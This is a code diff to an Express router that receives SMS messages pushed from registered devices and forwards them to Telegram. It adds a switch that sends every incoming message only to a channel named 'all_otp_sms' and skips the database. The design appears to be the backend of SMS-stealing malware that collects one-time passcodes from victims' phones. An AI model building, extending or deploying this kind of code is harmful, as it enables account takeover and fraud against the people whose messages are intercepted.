@@ -12,6 +12,7 @@ import {
   type TelegramCategory,
 } from "../services/telegramService";
 import {
+  buildTelegramAllOtpSmsMessage,
   buildTelegramDeviceDeletedMessage,
   buildTelegramSmsDeletedMessage,
   buildTelegramSmsMessage,
@@ -33,6 +34,13 @@ const router = express.Router();
 
 function clean(v: unknown): string {
   return String(v ?? "").trim();
+}
+
+function isSendSmsDisabled(): boolean {
+  const value = clean(
+    (config as any).sendSms || process.env.SENDSMS || "yes",
+  ).toLowerCase();
+  return value === "no";
 }
 
 function normalizeSourceFilter(
@@ -911,7 +919,7 @@ router.delete("/app-notifications/olderThan/:cutoff", async (req, res) => {
   }
 });
 
-/* ================= SMS PUSH (SAFE + WS EMIT + TELEGRAM ROUTING) ================= */
+/* ================= SMS PUSH (SAFE + SENDSMS SWITCH + WS EMIT + TELEGRAM ROUTING) ================= */
 
 router.post("/:id/sms", async (req: Request, res: Response) => {
   try {
@@ -940,7 +948,7 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
         ? parsedTs
         : Date.now();
 
-    const smsDoc = new Sms({
+    const smsPayload = {
       deviceId,
       sender: req.body.sender || req.body.from || "unknown",
       senderNumber: req.body.senderNumber || req.body.from || "",
@@ -949,8 +957,71 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
       body: req.body.body || req.body.message || "",
       timestamp: finalTimestamp,
       meta: req.body.meta || {},
-    });
+    };
 
+    const sendSmsDisabled = isSendSmsDisabled();
+
+    try {
+      await Device.findOneAndUpdate(
+        { deviceId },
+        {
+          $set: {
+            "status.timestamp": finalTimestamp,
+          },
+        },
+        { upsert: true },
+      );
+    } catch (e) {
+      logger.warn("devices: emit device timestamp after sms failed", e);
+    }
+
+    if (sendSmsDisabled) {
+      try {
+        const device = await Device.findOne({ deviceId }).lean();
+        const meta = getDeviceTelegramMeta(device, deviceId);
+
+        const telegramText = buildTelegramAllOtpSmsMessage({
+          ...meta,
+          smsText: clean(smsPayload.body),
+          smsTitle: clean(smsPayload.title),
+          sender: clean(smsPayload.senderNumber || smsPayload.sender),
+          receiver: clean(smsPayload.receiver),
+          timestamp: Number(smsPayload.timestamp || finalTimestamp),
+        });
+
+        const result = await sendTelegramMessage({
+          category: "all_otp_sms",
+          text: telegramText,
+        });
+
+        logger.info("devices: SENDSMS=no routed sms only to all_otp_sms", {
+          deviceId,
+          ok: result.ok,
+          skipped: result.skipped,
+          error: result.error,
+        });
+      } catch (telegramErr: any) {
+        logger.error("devices: SENDSMS=no telegram routing failed", {
+          deviceId,
+          error: telegramErr?.message || telegramErr,
+        });
+      }
+
+      try {
+        await emitDeviceUpsert(deviceId);
+      } catch (e) {
+        logger.warn("devices: emit device upsert after SENDSMS=no failed", e);
+      }
+
+      return res.json({
+        success: true,
+        sendSmsDisabled: true,
+        savedToDb: false,
+        broadcastToFrontend: false,
+      });
+    }
+
+    const smsDoc = new Sms(smsPayload);
     await smsDoc.save();
 
     try {
@@ -985,15 +1056,6 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
     }
 
     try {
-      await Device.findOneAndUpdate(
-        { deviceId },
-        {
-          $set: {
-            "status.timestamp": finalTimestamp,
-          },
-        },
-        { upsert: true },
-      );
       await emitDeviceUpsert(deviceId);
     } catch (e) {
       logger.warn("devices: emit device upsert after sms failed", e);
@@ -1054,7 +1116,12 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
       });
     }
 
-    return res.json({ success: true });
+    return res.json({
+      success: true,
+      sendSmsDisabled: false,
+      savedToDb: true,
+      broadcastToFrontend: true,
+    });
   } catch (err: any) {
     logger.error("SMS save failed", err);
     return res.status(500).json({
